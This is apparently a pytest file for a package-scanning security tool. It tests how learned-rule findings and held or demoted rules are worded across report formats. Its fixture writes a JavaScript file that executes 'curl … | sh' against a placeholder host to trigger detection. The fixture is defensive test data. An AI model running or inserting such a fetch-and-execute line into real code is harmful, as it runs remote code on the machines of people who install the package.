"""A learned finding says it is suspected and machine-made on every surface that lists findings, and a held rule says who holds it until when."""

from __future__ import annotations

import dataclasses
import json
from pathlib import Path
from typing import Any

from cordon_scanner import Scanner
from cordon_scanner.engine.registry import Registry
from cordon_scanner.foundation.config.settings import Config
from cordon_scanner.report.base import ReportOptions
from cordon_scanner.rules.demotion import RuleDemotion
from cordon_scanner.rules.loader import RuleLoader

SAID = "suspected, machine-made"


class Kit:
    @staticmethod
    def result(root: Path, rule_id: str) -> Any:
        (root / "package.json").write_text(
            json.dumps({"name": "p", "version": "1.0.0", "main": "i.js"}), encoding="utf-8"
        )
        (root / "i.js").write_text(
            "require('child_process').exec('curl -s https://x.example.invalid/a | sh');\n",
            encoding="utf-8",
        )
        scanned = Scanner(Config.default().with_overrides(use_cache=False, offline=True)).scan(root)
        assert scanned.findings
        return dataclasses.replace(
            scanned,
            findings=tuple(dataclasses.replace(f, rule_id=rule_id) for f in scanned.findings),
        )

    @staticmethod
    def render(reporter: str, result: Any) -> str:
        return b"".join(
            Registry().reporter(reporter).render(result, ReportOptions(color=False))
        ).decode()


class TestALearnedFindingIsNeverWordedAsConfirmed:
    def test_the_finding_carries_the_class_and_another_does_not(self, tmp_path: Path) -> None:
        learned = Kit.result(tmp_path, "LEARNED.X.001").findings[0]
        other = Kit.result(tmp_path, "MALWARE.X.001").findings[0]
        assert learned.assurance == SAID and other.assurance is None
        assert learned.to_dict()["assurance"] == SAID and "assurance" not in other.to_dict()

    def test_every_surface_that_lists_findings_says_so_for_a_learned_one_only(
        self, tmp_path: Path
    ) -> None:
        learned, other = (
            Kit.result(tmp_path, "LEARNED.X.001"),
            Kit.result(tmp_path, "MALWARE.X.001"),
        )
        for reporter in ("text", "json", "sarif", "markdown", "github"):
            assert SAID in Kit.render(reporter, learned).lower().replace(
                "suspected, machine-made", SAID
            ), reporter
            assert SAID not in Kit.render(reporter, other).lower(), reporter


class TestAHeldRuleSaysWhoHoldsItUntilWhen:
    def test_a_hold_reads_held_at_warn_by_the_role_until_the_date(self) -> None:
        assert (
            RuleDemotion.wording("held by security-lead until 2026-12-01: a vendor script")
            == "held at warn by security-lead until 2026-12-01: a vendor script"
        )

    def test_any_other_reason_keeps_the_demoted_wording(self) -> None:
        assert (
            RuleDemotion.wording("it fired on a fixture")
            == "demoted to warn: it fired on a fixture"
        )

    def test_the_finding_message_carries_the_hold(self) -> None:
        pack = RuleLoader.load_builtin()[0]
        rule_id = pack.rules[0].rule.id
        held = RuleDemotion.apply(
            pack, {rule_id: "held by security-lead until 2026-12-01: reviewed"}
        )
        assert held.rules[0].rule.message.startswith(
            "[held at warn by security-lead until 2026-12-01: reviewed]"
        )
